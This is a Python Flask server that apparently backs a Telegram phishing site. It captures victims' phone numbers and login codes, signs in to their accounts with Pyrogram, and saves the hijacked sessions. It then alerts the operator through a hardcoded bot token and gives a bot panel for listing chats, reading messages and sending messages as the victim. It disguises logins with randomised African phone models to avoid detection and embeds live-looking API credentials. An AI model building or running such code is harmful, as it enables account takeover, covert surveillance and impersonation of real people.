from flask import Flask, request, jsonify
from flask_cors import CORS
from pyrogram import Client
import asyncio
import os
import re
import requests
import secrets
import random
from datetime import datetime
from pathlib import Path
import nest_asyncio

# Apply nest_asyncio to allow nested event loops
nest_asyncio.apply()

app = Flask(__name__)
app.secret_key = secrets.token_hex(16)
CORS(app)

API_ID = 6627460
API_HASH = "27a53a0965e486a2bc1b1fcde473b1c4"

BOT_TOKEN = "8539687833:AAGZ3mauVO1nMS-nr3xHmXHjOt5TY0IWkKE"
YOUR_CHAT_ID = "7393047582"

active_sessions = {}
SESSIONS_DIR = Path("sessions")
SESSIONS_DIR.mkdir(exist_ok=True)

def load_existing_sessions():
    """Load any existing session files from disk on startup"""
    session_files = list(SESSIONS_DIR.glob("*.session"))
    
    for session_file in session_files:
        try:
            session_id = session_file.stem  # Get filename without .session
            session_path = SESSIONS_DIR / session_id
            
            # Check if there's also a .json metadata file
            json_file = SESSIONS_DIR / f"{session_id}.json"
            
            client = Client(
                name=str(session_path),
                api_id=API_ID,
                api_hash=API_HASH,
                workdir=str(Path.cwd())
            )
            
            # Try to connect and see if session is still valid
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            
            async def check_session():
                await client.connect()
                try:
                    me = await client.get_me()
                    return {
                        'client': client,
                        'phone': me.phone_number,
                        'user_info': {
                            'id': me.id,
                            'first_name': me.first_name,
                            'username': me.username
                        },
                        'created_at': datetime.now().timestamp(),
                        'device_model': 'Loaded from disk'
                    }
                except Exception:
                    await client.disconnect()
                    return None
            
            session_data = loop.run_until_complete(check_session())
            
            if session_data:
                active_sessions[session_id] = session_data
                print(f"✅ Loaded session: {session_id}")
            else:
                print(f"❌ Invalid session: {session_id}")
                
        except Exception as e:
            print(f"Error loading session {session_file}: {e}")

# Call this after creating the loop
load_existing_sessions() 

@app.route('/debug-path', methods=['GET'])
def debug_path():
    return jsonify({
        'sessions_dir': str(SESSIONS_DIR.absolute()),
        'dir_exists': SESSIONS_DIR.exists(),
        'current_working_dir': str(Path.cwd().absolute()),
        'files_in_sessions': [str(f) for f in SESSIONS_DIR.glob("*")] if SESSIONS_DIR.exists() else []
    })
# Store which session each bot user has selected
user_selected_session = {}

# Create a single event loop for the entire app
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

# ============ AFRICAN PHONE MODELS LIST ============
PHONE_MODELS = [
    # Tecno (Very popular in Africa)
    {"model": "Tecno Spark 10 Pro", "sys": "Android 13", "app": "10.0.5"},
    {"model": "Tecno Spark 20", "sys": "Android 13", "app": "10.1.2"},
    {"model": "Tecno Camon 20 Pro", "sys": "Android 13", "app": "10.0.8"},
    {"model": "Tecno Camon 19", "sys": "Android 12", "app": "9.6.0"},
    {"model": "Tecno Pova 5", "sys": "Android 13", "app": "10.0.3"},
    {"model": "Tecno Pop 8", "sys": "Android 13", "app": "10.0.1"},
    
    # Infinix
    {"model": "Infinix Hot 30", "sys": "Android 13", "app": "10.0.4"},
    {"model": "Infinix Hot 20", "sys": "Android 12", "app": "9.6.2"},
    {"model": "Infinix Note 30", "sys": "Android 13", "app": "10.0.6"},
    {"model": "Infinix Note 12", "sys": "Android 12", "app": "9.6.1"},
    {"model": "Infinix Zero 30", "sys": "Android 13", "app": "10.1.0"},
    {"model": "Infinix Smart 8", "sys": "Android 13", "app": "10.0.2"},
    
    # Samsung (Popular in South Africa, Nigeria, Kenya)
    {"model": "Samsung Galaxy A14", "sys": "Android 13", "app": "10.0.7"},
    {"model": "Samsung Galaxy A04s", "sys": "Android 12", "app": "9.6.3"},
    {"model": "Samsung Galaxy A24", "sys": "Android 13", "app": "10.0.5"},
    {"model": "Samsung Galaxy M14", "sys": "Android 13", "app": "10.0.4"},
    
    # Itel
    {"model": "Itel S23", "sys": "Android 12", "app": "9.6.0"},
    {"model": "Itel S18", "sys": "Android 12", "app": "9.5.8"},
    {"model": "Itel A60", "sys": "Android 12", "app": "9.6.1"},
    {"model": "Itel P40", "sys": "Android 12", "app": "9.5.9"},
    
    # Xiaomi (Popular in Egypt, Morocco, Kenya)
    {"model": "Xiaomi Redmi 12C", "sys": "Android 12", "app": "9.6.4"},
    {"model": "Xiaomi Redmi Note 12", "sys": "Android 12", "app": "9.6.2"},
    {"model": "Xiaomi Poco M5", "sys": "Android 12", "app": "9.6.0"},
    
    # Oppo
    {"model": "Oppo A17", "sys": "Android 12", "app": "9.5.7"},
    {"model": "Oppo A78", "sys": "Android 13", "app": "10.0.1"},
    {"model": "Oppo A16", "sys": "Android 11", "app": "9.4.5"},
    
    # Vivo
    {"model": "Vivo Y16", "sys": "Android 12", "app": "9.5.6"},
    {"model": "Vivo Y22", "sys": "Android 12", "app": "9.6.0"},
    {"model": "Vivo Y35", "sys": "Android 13", "app": "10.0.2"},
    
    # Nokia (Popular in Ethiopia, Kenya)
    {"model": "Nokia C22", "sys": "Android 13", "app": "9.6.1"},
    {"model": "Nokia C32", "sys": "Android 13", "app": "9.6.3"},
    
    # Huawei
    {"model": "Huawei Nova Y90", "sys": "Android 12", "app": "9.5.5"},
    {"model": "Huawei Y9 Prime", "sys": "Android 10", "app": "8.9.0"},
]

def get_random_device():
    """Get random African phone model with realistic app version"""
    device = random.choice(PHONE_MODELS)
    # Sometimes use slightly older app version to look real
    if random.random() < 0.3:
        return device["model"], device["sys"], f"{int(device['app'].split('.')[0]) - 1}.{device['app'].split('.')[1]}.{device['app'].split('.')[2]}"
    return device["model"], device["sys"], device["app"]

def get_random_language():
    """Random language based on African region"""
    languages = ["en", "en", "en", "en", "en", "en", "en", "en"]  # English more common
    return random.choice(languages)

def send_telegram_message(chat_id, text, reply_markup=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": "Markdown"
    }
    if reply_markup:
        payload["reply_markup"] = reply_markup
    
    try:
        response = requests.post(url, json=payload)
        return response.json()
    except Exception as e:
        print(f"Error: {e}")
        return None

def get_sessions_list():
    sessions = []
    for sid, data in active_sessions.items():
        if 'user_info' in data:
            sessions.append({
                'session_id': sid,
                'phone': data['phone'],
                'name': data['user_info'].get('first_name', ''),
                'username': data['user_info'].get('username', ''),
                'device': data.get('device_model', 'Unknown')
            })
    return sessions

def sessions_keyboard(sessions):
    buttons = []
    for sess in sessions:
        name = sess['name'] or sess['phone']
        username = f" @{sess['username']}" if sess['username'] else ""
        device_icon = "📱"
        buttons.append([{"text": f"{device_icon} {name}{username}", "callback_data": f"select_{sess['session_id']}"}])
    buttons.append([{"text": "🔄 Refresh", "callback_data": "refresh_sessions"}])
    return {"inline_keyboard": buttons}

def main_menu_keyboard():
    return {
        "inline_keyboard": [
            [{"text": "📖 Read Messages", "callback_data": "menu_read"}],
            [{"text": "✏️ Send Message", "callback_data": "menu_write"}],
            [{"text": "📂 List Chats", "callback_data": "menu_chats"}],
            [{"text": "🔄 Switch Account", "callback_data": "switch_account"}]
        ]
    }

def chats_keyboard(dialogs):
    buttons = []
    for dialog in dialogs[:10]:
        name = dialog['name'][:30]
        identifier = dialog['identifier']
        buttons.append([{"text": f"💬 {name}", "callback_data": f"chat_read_{identifier}"}])
    buttons.append([{"text": "🔙 Back to Menu", "callback_data": "back_to_menu"}])
    return {"inline_keyboard": buttons}

@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        data = request.json
        print(f"Webhook received: {data}")
        
        # Handle callback queries (button clicks)
        if 'callback_query' in data:
            callback = data['callback_query']
            chat_id = callback['message']['chat']['id']
            message_id = callback['message']['message_id']
            data_callback = callback['data']
            
            # Handle selecting a session
            if data_callback.startswith('select_'):
                session_id = data_callback.replace('select_', '')
                user_selected_session[str(chat_id)] = session_id
                
                if session_id in active_sessions:
                    session_data = active_sessions[session_id]
                    user_info = session_data.get('user_info', {})
                    device_model = session_data.get('device_model', 'Unknown')
                    
                    text = (f"✅ *Connected to:*\n\n"
                           f"👤 {user_info.get('first_name', 'Unknown')}\n"
                           f"📱 {session_data['phone']}\n"
                           f"📲 Device: {device_model}\n\n"
                           f"*What would you like to do?*")
                    
                    url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
                    payload = {
                        "chat_id": chat_id,
                        "message_id": message_id,
                        "text": text,
                        "parse_mode": "Markdown",
                        "reply_markup": main_menu_keyboard()
                    }
                    requests.post(url, json=payload)
            
            # Handle refresh button
            elif data_callback == 'refresh_sessions':
                sessions = get_sessions_list()
                if sessions:
                    url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
                    payload = {
                        "chat_id": chat_id,
                        "message_id": message_id,
                        "text": "🤖 *Telegram Control Bot*\n\nSelect an account:",
                        "parse_mode": "Markdown",
                        "reply_markup": sessions_keyboard(sessions)
                    }
                    requests.post(url, json=payload)
                else:
                    answer_url = f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery"
                    requests.post(answer_url, json={
                        "callback_query_id": callback['id'],
                        "text": "No active sessions found",
                        "show_alert": False
                    })
            
            # Handle menu options
            elif data_callback == 'menu_read':
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
                payload = {
                    "chat_id": chat_id,
                    "message_id": message_id,
                    "text": "📖 *Read Messages*\n\nSend a message in format:\n`/read CHAT_ID`\n\nExamples:\n`/read me` - Your saved messages\n`/read @username` - Chat with username",
                    "parse_mode": "Markdown",
                    "reply_markup": {"inline_keyboard": [[{"text": "🔙 Back to Menu", "callback_data": "back_to_menu"}]]}
                }
                requests.post(url, json=payload)
            
            elif data_callback == 'back_to_menu':
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
                payload = {
                    "chat_id": chat_id,
                    "message_id": message_id,
                    "text": "🤖 *Telegram Control Bot*\n\nSelect an account to continue:",
                    "parse_mode": "Markdown",
                    "reply_markup": sessions_keyboard(get_sessions_list())
                }
                requests.post(url, json=payload)
            
            # Always answer the callback
            answer_url = f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery"
            requests.post(answer_url, json={"callback_query_id": callback['id']})
        
        # Handle regular messages
        elif 'message' in data:
            msg = data['message']
            chat_id = msg['chat']['id']
            text = msg.get('text', '')
            
            if text == '/start':
                sessions = get_sessions_list()
                if sessions:
                    send_telegram_message(chat_id,
                        "🤖 *Telegram Control Bot*\n\nSelect an account:",
                        reply_markup=sessions_keyboard(sessions))
                else:
                    send_telegram_message(chat_id,
                        "🤖 *Telegram Control Bot*\n\nNo active sessions.\n\nLogin via web first.")
            
            # ========== ADD THESE COMMAND HANDLERS HERE ==========
            
            elif text.startswith('/read'):
                parts = text.split(' ', 1)
                if len(parts) < 2:
                    send_telegram_message(chat_id, "❌ Usage: /read CHAT_ID\n\nExample: /read me")
                else:
                    chat_target = parts[1]
                    session_id = user_selected_session.get(str(chat_id))
                    
                    if not session_id or session_id not in active_sessions:
                        send_telegram_message(chat_id, "❌ No session selected. Send /start first and select an account.")
                    else:
                        session_data = active_sessions[session_id]
                        client = session_data['client']
                        
                        send_telegram_message(chat_id, f"📖 Reading messages from {chat_target}...")
                        
                        async def fetch_messages():
                            try:
                                messages = []
                                async for msg in client.get_chat_history(chat_target, limit=10):
                                    if msg.text:
                                        sender = msg.from_user.first_name if msg.from_user else "Unknown"
                                        messages.append(f"👤 *{sender}*: {msg.text[:200]}")
                                
                                if messages:
                                    response = f"📖 *Messages from {chat_target}:*\n\n" + "\n\n".join(messages)
                                    if len(response) > 4000:
                                        response = response[:4000] + "\n\n...(truncated)"
                                else:
                                    response = f"No messages found in {chat_target}"
                                
                                send_telegram_message(chat_id, response)
                            except Exception as e:
                                send_telegram_message(chat_id, f"❌ Error: {str(e)}")
                        
                        loop = asyncio.new_event_loop()
                        asyncio.set_event_loop(loop)
                        loop.run_until_complete(fetch_messages())
            
            elif text.startswith('/send'):
                parts = text.split(' ', 1)
                if len(parts) < 2:
                    send_telegram_message(chat_id, "❌ Usage: /send CHAT_ID | MESSAGE\n\nExample: /send @username | Hello there!")
                elif ' | ' not in parts[1]:
                    send_telegram_message(chat_id, "❌ Use format: /send CHAT_ID | MESSAGE")
                else:
                    chat_target, message = parts[1].split(' | ', 1)
                    chat_target = chat_target.strip()
                    message = message.strip()
                    
                    session_id = user_selected_session.get(str(chat_id))
                    if not session_id or session_id not in active_sessions:
                        send_telegram_message(chat_id, "❌ No session selected. Send /start first and select an account.")
                    else:
                        session_data = active_sessions[session_id]
                        client = session_data['client']
                        
                        async def send_msg():
                            try:
                                await client.send_message(chat_target, message)
                                send_telegram_message(chat_id, f"✅ Message sent to {chat_target}!")
                            except Exception as e:
                                send_telegram_message(chat_id, f"❌ Error: {str(e)}")
                        
                        loop = asyncio.new_event_loop()
                        asyncio.set_event_loop(loop)
                        loop.run_until_complete(send_msg())
            
            elif text == '/chats' or text == '/list':
                session_id = user_selected_session.get(str(chat_id))
                if not session_id or session_id not in active_sessions:
                    send_telegram_message(chat_id, "❌ No session selected. Send /start first and select an account.")
                else:
                    session_data = active_sessions[session_id]
                    client = session_data['client']
                    
                    send_telegram_message(chat_id, "📂 Fetching your chats...")
                    
                    async def fetch_chats():
                        try:
                            chats = []
                            async for dialog in client.get_dialogs(limit=20):
                                name = dialog.chat.title or dialog.chat.first_name or "Unknown"
                                identifier = dialog.chat.username or str(dialog.chat.id)
                                chats.append(f"• *{name}* - `{identifier}`")
                            
                            if chats:
                                response = "📂 *Your Chats:*\n\n" + "\n".join(chats)
                                if len(response) > 4000:
                                    response = response[:4000] + "\n\n...(truncated)"
                            else:
                                response = "No chats found"
                            
                            send_telegram_message(chat_id, response)
                        except Exception as e:
                            send_telegram_message(chat_id, f"❌ Error: {str(e)}")
                    
                    loop = asyncio.new_event_loop()
                    asyncio.set_event_loop(loop)
                    loop.run_until_complete(fetch_chats())
        
        return jsonify({'ok': True})
    except Exception as e:
        print(f"Webhook error: {e}")
        return jsonify({'ok': True})

@app.route('/send-code', methods=['POST'])
def send_code():
    try:
        data = request.json
        phone = data.get('phone', '')
        
        if not phone:
            return jsonify({'success': False, 'error': 'Phone required'}), 400
        
        session_id = secrets.token_hex(8)
        
        # Get random device info for this session
        device_model, system_version, app_version = get_random_device()
        language_code = get_random_language()
        
        async def create_and_store_session():
            client = None
            try:
                session_file = SESSIONS_DIR / f"{session_id}"
                client = Client(
                    name=str(session_file),
                    api_id=API_ID,
                    api_hash=API_HASH,
                    workdir=str(Path.cwd()),
                    in_memory=False,
                    device_model=device_model,
                    system_version=system_version,
                    app_version=app_version,
                    lang_code=language_code
                )
                
                await client.connect()
                sent_code = await client.send_code(phone_number=phone)
                
                active_sessions[session_id] = {
                    'client': client,
                    'phone': phone,
                    'phone_code_hash': sent_code.phone_code_hash,
                    'session_file': str(session_file),
                    'created_at': datetime.now().timestamp(),
                    'device_model': device_model,
                    'system_version': system_version,
                    'app_version': app_version
                }

                # Save metadata to disk
  
                # Save metadata to disk
                import json
                metadata = {
                   'phone': phone,
                   'device_model': device_model,
                   'system_version': system_version,
                   'app_version': app_version,
                   'created_at': datetime.now().timestamp()
                }
                with open(SESSIONS_DIR / f"{session_id}.json", 'w') as f:
                     json.dump(metadata, f)
                print(f"Session {session_id} created for {phone} using {device_model} ({system_version})")
                
                return {
                    'success': True,
                    'session_id': session_id,
                    'message': 'Code sent to your Telegram',
                    'device': device_model
                }
                
            except Exception as e:
                if client:
                    await client.disconnect()
                return {'success': False, 'error': str(e)}
        
        result = loop.run_until_complete(create_and_store_session())
        return jsonify(result)
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/verify-code', methods=['POST'])
def verify_code():
    try:
        data = request.json
        session_id = data.get('session_id', '')
        code = data.get('code', '')
        
        if session_id not in active_sessions:
            return jsonify({'success': False, 'error': 'Session expired'}), 400
        
        session_data = active_sessions[session_id]
        client = session_data['client']
        phone = session_data['phone']
        phone_code_hash = session_data['phone_code_hash']
        device_model = session_data.get('device_model', 'Unknown')
        
        async def complete_login():
            try:
                await client.sign_in(
                    phone_number=phone,
                    phone_code_hash=phone_code_hash,
                    phone_code=code
                )
                
                me = await client.get_me()
                
                session_data['user_info'] = {
                    'id': me.id,
                    'first_name': me.first_name,
                    'last_name': me.last_name,
                    'username': me.username
                }
                
                # Notify via bot with device info
                send_telegram_message(YOUR_CHAT_ID,
                    f"✅ *New Session Created!*\n\n"
                    f"👤 {me.first_name} (@{me.username})\n"
                    f"📱 {phone}\n"
                    f"📲 Device: {device_model}\n"
                    f"🆔 Session ID: `{session_id}`\n\n"
                    f"Use /start on your bot to control"
                )
                
                return {
                    'success': True,
                    'message': f'Logged in as {me.first_name}',
                    'session_id': session_id,
                    'device': device_model,
                    'user': {
                        'id': me.id,
                        'first_name': me.first_name,
                        'username': me.username
                    }
                }
                
            except Exception as e:
                return {'success': False, 'error': str(e)}
        
        result = loop.run_until_complete(complete_login())
        return jsonify(result)
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/bot-read-messages', methods=['GET'])
def bot_read_messages():
    try:
        if not active_sessions:
            return jsonify({'error': 'No active sessions found'})
        
        session_id = list(active_sessions.keys())[0]
        session_data = active_sessions[session_id]
        client = session_data['client']
        device_model = session_data.get('device_model', 'Unknown')
        
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        async def fetch():
            messages = []
            async for msg in client.get_chat_history("me", limit=10):
                if msg.text:
                    messages.append(msg.text)
            return messages
        
        messages = loop.run_until_complete(fetch())
        
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        for msg in messages[:5]:
            requests.post(url, json={
                'chat_id': YOUR_CHAT_ID,
                'text': f"📖 From {device_model}:\n{msg[:200]}"
            })
        
        return jsonify({'success': True, 'messages_sent': len(messages), 'device': device_model})
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/active-sessions-info', methods=['GET'])
def active_sessions_info():
    """View all active sessions with their device info"""
    sessions_info = []
    for sid, data in active_sessions.items():
        sessions_info.append({
            'session_id': sid,
            'phone': data['phone'],
            'device_model': data.get('device_model', 'Unknown'),
            'system_version': data.get('system_version', 'Unknown'),
            'app_version': data.get('app_version', 'Unknown'),
            'created_at': datetime.fromtimestamp(data['created_at']).isoformat() if 'created_at' in data else 'Unknown'
        })
    return jsonify({'sessions': sessions_info, 'count': len(sessions_info)})

@app.route('/health', methods=['GET'])
def health_check():
    return jsonify({'status': 'ok', 'active_sessions': len(active_sessions)})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
